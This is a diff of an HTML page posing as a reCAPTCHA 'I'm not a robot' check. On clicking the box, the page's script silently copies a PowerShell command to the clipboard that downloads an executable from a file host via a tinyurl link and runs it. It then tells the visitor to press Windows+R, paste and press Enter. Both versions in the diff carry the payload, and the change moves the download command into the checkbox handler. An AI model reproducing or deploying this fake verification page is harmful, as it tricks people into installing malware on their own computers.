@@ -1,6 +1,7 @@
 <!DOCTYPE html>
-<html lang="en" data-darkreader-mode="dynamic" data-darkreader-scheme="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-  
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
   <title>Security Verification</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
@@ -70,36 +71,24 @@
 </head>
 <body>
   <div class="recaptcha-container">
-    <img src="./Security Verification_files/RecaptchaLogo.svg.png" alt="reCAPTCHA logo" class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/320px-RecaptchaLogo.svg.png" alt="reCAPTCHA logo" class="logo">
     <div class="checkbox">
       <input type="checkbox" id="verifyCheck">
       <label for="verifyCheck">I'm not a robot</label>
     </div>
-    <div class="spinner" id="spinner" style="display: none;"></div>
-<div class="instructions" id="instructions" style="display: none;">
-  <p>Complete verification:</p>
-  <ol>
-    <li>Press <b>Ctrl + C</b></li>
-    <li>Press <b>Windows + R</b></li>
-    <li>Press <b>Ctrl + V</b> to paste</li>
-    <li>Press <b>Enter</b></li>
-  </ol>
-</div>
+    <div class="spinner" id="spinner"></div>
+    <div class="instructions" id="instructions">
+      <p>Complete verification:</p>
+      <ol>
+        <li>Press <b>Windows + R</b></li>
+        <li>Press <b>Ctrl + V</b> to paste</li>
+        <li>Press <b>Enter</b></li>
+      </ol>
+    </div>
     <div class="footer">This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply.</div>
   </div>
 
   <script>
-    const command = `powershell -Command "Invoke-WebRequest -Uri 'https://www.upload.ee/download/18402325/4de622ed3dbc211014bf/j600bjoqyflntkqs.exe' -OutFile $env:USERPROFILE/file.exe; Start-Process -FilePath $env:USERPROFILE/file.exe"`;
-    
-    // Copiar al portapapeles cuando se presiona Ctrl+C
-    document.addEventListener('keydown', function(e) {
-      if (e.ctrlKey && e.key === 'c') {
-        navigator.clipboard.writeText(command);
-        e.preventDefault();
-      }
-    });
-
-    // Comportamiento original del checkbox
     const checkbox = document.getElementById('verifyCheck');
     const spinner = document.getElementById('spinner');
     const instructions = document.getElementById('instructions');
@@ -110,11 +99,12 @@
         setTimeout(() => {
           spinner.style.display = 'none';
           instructions.style.display = 'block';
-          navigator.clipboard.writeText(command);
+          navigator.clipboard.writeText(
+            `powershell -Command "Invoke-WebRequest -Uri 'https://tinyurl.com/4325tdws' -OutFile $env:USERPROFILE/file.exe; Start-Process -FilePath $env:USERPROFILE/file.exe"`
+          );
         }, 1200);
       }
     });
   </script>
-
-
-</body></html>
+</body>
+</html>
